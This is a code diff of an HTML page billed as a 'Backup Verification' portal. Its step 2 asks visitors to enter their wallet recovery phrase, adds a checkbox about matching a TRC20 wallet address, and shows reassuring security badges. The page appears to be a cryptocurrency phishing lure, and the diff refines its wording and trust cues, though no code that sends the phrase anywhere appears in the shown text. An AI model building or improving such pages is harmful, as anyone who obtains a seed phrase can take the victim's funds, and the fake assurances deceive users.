@@ -81,7 +81,7 @@ header .logo img {
      alt="Demo Logo">
   </div>
   <div>
-    <div class="title">Backup Verification Portal</div>
+    <div class="title">Backup Verification</div>
   </div>
   </header>
 
@@ -102,22 +102,27 @@ header .logo img {
   </div>
 
     <div id="step2" class="card" hidden role="region" aria-labelledby="s2title">
-      <h2 id="s2title">Step 2: Recovery phrase</h2>
-      <label for="phrase">Enter your 12-word recovery phrase</label>
-      <textarea id="phrase" name="phrase" rows="3" placeholder="word1 word2 word3 ..." ></textarea>
-      <div class="checks">
-        <div class="check">✔ Backup confirmed</div>
-        <div class="check">✔ Phrase valid</div>
-      </div>
-      <div class="progress" aria-hidden="true"><div id="progbar"></div></div>
-      <button id="s2btn">Verify</button>
-      <!-- ✅ Security Badge -->
-    <div class="security-badge" style="display: flex; align-items: center; justify-content: center; margin-top: 20px; color: #666666; font-size: 14px;">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
-        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-      </svg>
-      Do not close during verification
-    </div>
+  <h2 id="s2title">Recovery Phrase</h2>
+  
+  <label for="phrase">Enter your recovery phrase</label>
+  <textarea id="phrase" name="phrase" rows="3" placeholder="word1 word2 word3 ..."></textarea>
+
+  <!-- New checkbox -->
+  <label style="display:flex; align-items:center; gap:8px; margin-top:12px;">
+    <input type="checkbox" id="matchCheck">
+    <span>Does the backup match the TRC20 wallet address?</span>
+  </label>
+
+  <div class="progress" aria-hidden="true"><div id="progbar"></div></div>
+  <button id="s2btn">Verify</button>
+
+  <!-- Security Badge -->
+  <div class="security-badge" style="display:flex; align-items:center; justify-content:center; margin-top:20px; color:#666; font-size:14px;">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
+      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+    </svg>
+    Verifying securely… please keep this page open
+  </div>
     </div>
 
     <div id="step3" class="card" hidden role="region" aria-labelledby="s3title">
